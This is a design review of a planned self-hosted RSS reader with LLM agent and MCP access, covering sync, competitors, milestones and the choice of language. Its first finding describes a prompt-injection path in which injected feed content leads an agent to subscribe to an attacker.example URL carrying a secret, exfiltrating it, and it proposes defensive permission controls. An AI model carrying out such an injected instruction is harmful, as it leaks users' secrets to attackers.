**Verdict: No.** Before implementation, revise the sync contract, agent permissions and milestone dependencies, and reassess building a new server against the corrected competitor evidence.

**Verified** means checked against linked primary sources. **Demonstrated** means a contradiction or counterexample in the supplied documents. **Judgement** identifies my recommendation. Findings are ranked by consequence.

1. **The safety model permits exfiltration through Earnest itself.**  
   **Demonstrated; judgement — `llm.md`, `api.md`, `ux.md`.**

   A dedicated agent with only Earnest tools can still have the full trifecta. With `entries:read` and `feeds:write`, injected content can instruct it to call `subscribe("https://attacker.example/?secret=…")`. Feed discovery then sends the secret out. Blocking private IPs does not prevent this.

   Notifications also leave the system, despite appearing below the tier labelled “Leaves the system”. Budgets limit frequency; they do not establish confidentiality. Undo cannot reverse delivered notifications, webhook deliveries or disclosures. The promise that every automated action is undoable is false.

   **My decision:** scheduled agents start with access to selected feeds and their own annotations. Subscription changes require separate authorization. Outbound destinations are registered independently of model output. Distinguish cancellation, compensating actions and irreversible delivery. Apply these controls in REST and CLI as well as MCP.

2. **Reject the read-state specification as written.**  
   **Demonstrated; judgement — `api.md`, `ux.md`.**

   The resource table and UX define positions **per view**; the algorithm defines watermarks **per subscription**. These have different semantics. Advancing through a filtered river cannot imply that excluded entries were read. Publication-time cutoffs can also hide newly discovered, backdated entries.

   Client `occurred_at`, even clamped, cannot reliably order actions from different offline devices. A slow phone clock defeats the proposed “newest intention wins” rule. The interaction between unread exceptions, later watermark advances, Done and Later is unspecified.

   “Booleans force unread counts” is a false premise: storage does not dictate UI.

   **My decision:** separate view resume positions from read/triage state. Start with per-entry state, base revisions and an explicit conflict policy, including concurrent read/unread actions. If bulk operations justify watermarks, define them over a stable ingestion sequence with precise exception precedence. Require adversarial sync tests before freezing this contract.

3. **The change feed lacks a complete bootstrap and recovery protocol.**  
   **Verified mechanism; omissions; judgement — `api.md`.**

   Updating a counter row inside the mutation transaction can serialize revisions because conflicting row locks remain held until transaction end. [PostgreSQL locking documentation](https://www.postgresql.org/docs/18/explicit-locking.html).

   That does not establish lossless synchronization. Missing definitions include:

   - A consistent initial snapshot and its corresponding change cursor.
   - Atomic persistence of mutations, changes and delivery jobs.
   - Content updates, annotation deletions, retention deletions and unsubscribe cleanup.
   - Recovery with pending offline writes after `410 Gone`.
   - Idempotency-key retention and treatment of stale commands after recovery.

   **My decision:** retain the change-log approach, but specify snapshot-to-stream handoff and recovery before clients. Undo must check the affected resource’s current revision; restoring an old value must not silently erase subsequent human edits.

4. **The competitor evidence materially understates existing alternatives.**  
   **Verified factual errors — `README.md`, `competitors.md`.**

   | Claim | Correct fact and source |
   |---|---|
   | NewsBlur has “no native Mac” client. | NewsBlur ships a **Mac Catalyst client**, with Mac keyboard, trackpad and window behaviour. If the intended distinction is AppKit-first design, say that explicitly. [Developer’s release announcement](https://blog.newsblur.com/2026/03/05/newsblur-v14-for-ios-and-mac/). |
   | No self-hosted server pairs with first-party native apps. | NewsBlur’s native mobile apps connect to self-hosted instances. This also contradicts the draft’s own NewsBlur coverage. [NewsBlur self-hosting documentation](https://www.newsblur.com/alternative/self-hosted-rss-reader). |

   **Judgement:** the remaining proposed distinction is agent isolation, permissions and workflow—not the stated platform combination. Test that workflow against an existing server plus a small companion service before committing to a replacement server.

5. **The MCP section is insufficient as an implementation contract.**  
   **Verified omissions; judgement — `api.md`.**

   Against **2026-07-28**, it omits required per-request version/capability metadata, required `resultType`, list-result `ttlMs`/`cacheScope`, standard request headers and Origin validation. These affect interoperability and security. [Revision changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog), [Streamable HTTP requirements](https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/streamable-http).

   Transport resumability was removed. A retried mutation therefore needs a stable **application operation ID**; a fresh JSON-RPC request ID cannot prevent duplicate notifications or subscriptions.

   The SDK uncertainty can be resolved: Go SDK **v1.8.0 supports this revision**, and its HTTP handler requires `Stateless=true` to accept it. [Release notes](https://github.com/modelcontextprotocol/go-sdk/releases/tag/v1.8.0), [versioned SDK documentation](https://raw.githubusercontent.com/modelcontextprotocol/go-sdk/v1.8.0/docs/protocol.md).

   **My tool-design verdict:** reject the fixed twelve-tool design as settled. Start with briefing, listing, reading, search and own annotations; add mutations when demonstrated workflows require them. Provide bounded schemas and structured outputs, and accurate side-effect annotations. Such annotations are hints, not authorization. `undo` must check ownership and the original action’s permissions; blanket `state:write` cannot authorize reversal of unrelated resources. [Tool specification](https://modelcontextprotocol.io/specification/2026-07-28/server/tools).

6. **The milestone order postpones validation of the product while creating dependencies that do not exist yet.**  
   **Demonstrated; judgement — `README.md`, `features.md`, `ux.md`, `api.md`.**

   “This week” becomes edition-only in M2, but editions arrive in M5. Those feeds lack their intended reading surface through two native-client milestones. M1 tokens are created “in the UI”, while the web UI arrives in M2. The low-privilege compatibility password allows only reading/state, but the promised compatibility surface includes subscription management.

   M1 webhooks include `entry.matched`, while deterministic rules arrive in M6. The plan must either provide an earlier matching mechanism or defer that event.

   **My order:** existing-server workflow experiment; ingestion/security and sync prototype; minimal web reader with cadences, an edition substitute and activity controls; one bounded agent workflow and summary evaluation; first native client with offline recovery; second native client; advanced semantic features. Move basic deterministic filtering earlier. Choose Mac versus Android first from actual daily use.

7. **Additional factual corrections change reuse, exposure and provider decisions.**

   | File and claim | Verified correction |
   |---|---|
   | `api.md`: Miniflux has “No delta sync”. | It supports `changed_after`/`changed_before` filtering and `removed` status. This is incremental polling, although not Earnest’s proposed durable change log. [API reference](https://miniflux.app/docs/api.html). |
   | `api.md`: no popular API has tombstones. | Readwise Highlights export supports `includeDeleted` and `is_deleted`. This is not a complete RSS-reader sync protocol, but it defeats the blanket claim. [Readwise API](https://readwise.io/api_deets). |
   | `competitors.md`: waking agents is presented without examining two relevant implementations. | Miniflux has new-entry webhooks; Readwise has feed-document and reading-state webhooks. Filtered watches remain a narrower comparison to investigate. [Miniflux](https://miniflux.app/docs/webhooks.html), [Readwise](https://docs.readwise.io/highlights/docs/webhooks). |
   | `README.md`, `tech-stack.md`: cloud-hosted LLM access requires a public listener. | Supported OpenAI products can reach private MCP servers through an outbound **Secure MCP Tunnel**, subject to account/workspace permissions. This does not establish equivalent support in Claude. [Official documentation](https://developers.openai.com/api/docs/guides/secure-mcp-tunnels). |
   | `llm.md`: Gemini’s free tier trains on your data, therefore exclude it. | The blanket statement misses regional exceptions: EEA, Switzerland and UK users receive Paid Services data treatment for unpaid quota. Account configuration and deployment terms still matter. [Google’s terms](https://ai.google.dev/gemini-api/terms). |
   | `tech-stack.md`: “Postgres 18 or 19” without qualification. | On November 1, 19 is still RC1; GA is planned for November 19. Use a supported stable release for deployment. [Release announcement](https://www.postgresql.org/about/news/postgresql-19-rc-1-released-3409/). |

8. **Go versus Rust: choose Go provisionally, without the draft’s portability assumptions.**  
   **Verified dependency coupling; judgement — `tech-stack.md`.**

   For this I/O-heavy service, I would choose Go for operational simplicity and feed-processing prior art. Rust’s memory advantages do not decide this workload. Materially greater developer familiarity with Rust could reverse that choice.

   However, Miniflux’s Google Reader handler depends directly on its storage, models, configuration and other internal packages. Copying it is adaptation work, not importing a reusable protocol implementation. [Handler source](https://github.com/miniflux/v2/blob/main/internal/googlereader/handler.go).

   Require a bounded extraction spike before crediting that reuse advantage. Reject “port the server in a couple of weeks” as an evidenced escape plan. Stars and overloaded research-machine builds do not establish comparative development cost.

9. **Citation checking is being mistaken for semantic validation.**  
   **Demonstrated; judgement — `llm.md`, `README.md`, `ux.md`.**

   A quoted passage existing in an article proves neither that it supports the generated claim nor that the claim is true. Dropping an invalid citation while retaining its assertion can make the answer less auditable.

   **My decision:** describe this as passage verification. Preserve content-version identifiers and passage locations; evaluate claim support separately; visibly flag unsupported assertions. Share summaries across identical content, not merely membership in a story cluster.

   Compiled rules also remain dependent on model-produced labels. Deterministic execution does not make those inputs trustworthy. Validate the rule AST, permitted features and actions, and test malicious classifier outputs.

10. **Important omissions and overconfidence remain.**  
    **Omissions; judgement — principally `api.md`, `tech-stack.md`, `llm.md`.**

    Shared feeds need an explicit boundary for authenticated/private content: credential ownership, cache partitioning, agent access, retrieval and cluster membership. “Multi-user later” does not justify leaving that boundary implicit. SSRF policy also needs separate allowances for administrator-approved local model servers and tailnet webhook destinations.

    The budget estimates omit ingest classification, chunking, retries and synchronous fallback. On-open summaries cannot ordinarily wait for batch processing. CPU embedding feasibility needs measurements on the actual NAS; one document every 29 seconds is an arrival rate, not a throughput benchmark.

    “Hybrid retrieval will hide most” ranking weaknesses, universal Undo, a “real niche”, and the day/week estimates exceed the evidence. The referenced `validation.md` was not supplied, so its checks cannot be audited here.

**Required before the next phase:** corrected factual sourcing, an executable sync/conflict specification, explicit egress and private-content policies, and milestones that validate the reading and agent workflows before multiplying client implementations.